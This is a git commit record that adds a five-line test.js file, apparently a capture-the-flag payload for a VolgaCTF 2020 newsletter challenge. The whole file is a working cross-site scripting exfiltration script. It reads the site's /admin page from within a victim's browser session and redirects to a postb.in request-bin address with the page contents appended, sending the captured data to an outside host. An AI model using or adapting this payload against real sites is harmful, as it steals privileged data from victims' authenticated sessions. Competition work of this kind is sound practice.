5b5ef6f4c9449f4bdbe5603631237c2b0dd9eb63
phulelouch <phulelouch@localhost.localdomain>
2020-03-28 02:23:40 -0400

    Initial commit

---
+++ test.js
@@ -0,0 +1,5 @@
+var a = new XMLHttpRequest();
+a.open('GET', 'newsletter.q.2020.volgactf.ru/admin', false);
+a.send(null);
+b = a.responseText;
+location.href = 'https://postb.in/1585337011882-6569399423897' + escape(b);
